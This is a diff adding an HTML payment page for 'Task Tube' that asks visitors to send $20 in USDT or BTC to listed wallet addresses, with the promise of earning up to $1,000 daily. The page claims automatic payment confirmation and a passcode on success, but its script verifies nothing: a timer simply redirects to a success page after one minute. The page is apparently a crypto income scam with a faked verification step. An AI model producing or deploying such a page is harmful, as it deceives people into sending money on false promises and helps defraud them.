@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Make a $20 crypto payment in USDT (TRC20) or BTC to join Task Tube and start earning up to $1,000 daily!" />
+  <meta name="keywords" content="Task Tube, crypto payment, USDT, BTC, earn money online, passive income" />
+  <meta name="author" content="Task Tube" />
+  <title>Crypto Payment | Task Tube</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" />
+  <script src="https://kit.fontawesome.com/32bbba991c.js" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #f5f7fa;
+      color: #333;
+      padding: 20px;
+    }
+    .modal {
+      max-width: 400px;
+      margin: auto;
+      background: #fff;
+      padding: 25px;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+    }
+    h3,
+    p {
+      text-align: center;
+      margin-bottom: 15px;
+    }
+    .container {
+      margin-bottom: 20px;
+    }
+    .container img {
+      width: 100%;
+      border-radius: 10px;
+    }
+    .wallet-box {
+      background: #f0f0f0;
+      padding: 10px 15px;
+      margin-bottom: 15px;
+      border-radius: 8px;
+      position: relative;
+      font-size: 14px;
+      word-break: break-all;
+    }
+    .wallet-box i.copy-btn {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #007bff;
+    }
+    .spinner {
+      width: 2em;
+      height: 2em;
+      margin: 20px auto;
+      position: relative;
+    }
+    .spinner-blade {
+      position: absolute;
+      width: 3px;
+      height: 20%;
+      background-color: #007bff;
+      border-radius: 3px;
+      top: 0;
+      left: 50%;
+      transform-origin: bottom center;
+      animation: spinner-fade 1s linear infinite;
+    }
+    .spinner-blade:nth-child(1) { transform: rotate(0deg) translateY(-150%); animation-delay: -0.9167s; }
+    .spinner-blade:nth-child(2) { transform: rotate(30deg) translateY(-150%); animation-delay: -0.8333s; }
+    .spinner-blade:nth-child(3) { transform: rotate(60deg) translateY(-150%); animation-delay: -0.75s; }
+    .spinner-blade:nth-child(4) { transform: rotate(90deg) translateY(-150%); animation-delay: -0.6667s; }
+    .spinner-blade:nth-child(5) { transform: rotate(120deg) translateY(-150%); animation-delay: -0.5833s; }
+    .spinner-blade:nth-child(6) { transform: rotate(150deg) translateY(-150%); animation-delay: -0.5s; }
+    .spinner-blade:nth-child(7) { transform: rotate(180deg) translateY(-150%); animation-delay: -0.4167s; }
+    .spinner-blade:nth-child(8) { transform: rotate(210deg) translateY(-150%); animation-delay: -0.3333s; }
+    .spinner-blade:nth-child(9) { transform: rotate(240deg) translateY(-150%); animation-delay: -0.25s; }
+    .spinner-blade:nth-child(10) { transform: rotate(270deg) translateY(-150%); animation-delay: -0.1667s; }
+    .spinner-blade:nth-child(11) { transform: rotate(300deg) translateY(-150%); animation-delay: -0.0833s; }
+    .spinner-blade:nth-child(12) { transform: rotate(330deg) translateY(-150%); animation-delay: 0s; }
+
+    @keyframes spinner-fade {
+      0% { opacity: 1; }
+      100% { opacity: 0.25; }
+    }
+
+    .timer {
+      text-align: center;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+
+    .passcode-box {
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .passcode-box input {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #ddd;
+      border-radius: 8px;
+      font-size: 16px;
+      text-align: center;
+      background-color: #f9f9f9;
+    }
+
+    .footer-note {
+      text-align: center;
+      font-size: 13px;
+      margin-top: 10px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div class="modal" role="main">
+    <h3>Crypto Payment</h3>
+    <p>Pay $20 worth of USDT (TRC20) or BTC using your crypto app. Use any of the wallet addresses below.</p>
+    <p>Your 5-digit passcode will display below once your payment is confirmed.</p>
+
+    <div class="container">
+      <img src="img/crypto.jpg" alt="Crypto Payment" />
+    </div>
+
+    <div class="wallet-box">
+      <strong>USDT (TRC20):</strong><br />
+      <span id="usdt-address">TXUP2YGDXokgixYXmP4VmCbK5ZfbiQUz8w</span>
+      <i class="far fa-copy copy-btn" onclick="copyToClipboard('usdt-address', 'USDT')" aria-label="Copy USDT address"></i>
+    </div>
+
+    <div class="wallet-box">
+      <strong>BTC:</strong><br />
+      <span id="btc-address">bc1q3j92qrkaumxg9hmm2ysqru735wy8qfjh4duvtk</span>
+      <i class="far fa-copy copy-btn" onclick="copyToClipboard('btc-address', 'BTC')" aria-label="Copy BTC address"></i>
+    </div>
+
+    <div class="spinner" aria-label="Loading">
+      <div class="spinner-blade"></div>
+      <div class="spinner-blade"></div>
+      <div class="spinner-blade"></div>
+      <div class="spinner-blade"></div>
+      <div class="spinner-blade"></div>
+      <div class="spinner-blade"></div>
+      <div class="spinner-blade"></div>
+      <div class="spinner-blade"></div>
+      <div class="spinner-blade"></div>
+      <div class="spinner-blade"></div>
+      <div class="spinner-blade"></div>
+      <div class="spinner-blade"></div>
+    </div>
+
+    <div class="timer">
+      Auto-confirmation is on...<br />
+      Payment will close in <span id="timer">10:00</span> minutes
+    </div>
+
+    <div class="passcode-box">
+      <input type="text" id="passcode" value="Passcode will display here..." readonly aria-label="Passcode display" />
+    </div>
+
+    <div class="footer-note">
+      Thank you for your trust in our service.
+    </div>
+  </div>
+
+  <script>
+    // Countdown Timer
+    let countdown = 600; // 10 minutes in seconds
+    const timerElement = document.getElementById('timer');
+
+    function updateTimer() {
+      const mins = String(Math.floor(countdown / 60)).padStart(2, '0');
+      const secs = String(countdown % 60).padStart(2, '0');
+      timerElement.textContent = `${mins}:${secs}`;
+      if (mins === '09' && secs === '00') {
+        window.location.href = 'https://tasktube.app/success.html';
+      }
+    }
+
+    const timerInterval = setInterval(() => {
+      if (countdown > 0) {
+        countdown--;
+        updateTimer();
+      } else {
+        clearInterval(timerInterval);
+        window.location.href = 'https://tasktube.app/index.html';
+      }
+    }, 1000);
+
+    // Copy function
+    function copyToClipboard(elementId, label) {
+      const text = document.getElementById(elementId).textContent;
+      navigator.clipboard.writeText(text).then(() => {
+        Swal.fire({
+          icon: 'success',
+          title: `${label} Address Copied`,
+          text: 'The address has been copied to your clipboard!',
+          timer: 2000,
+          showConfirmButton: false,
+        });
+      });
+    }
+  </script>
+</body>
+</html>
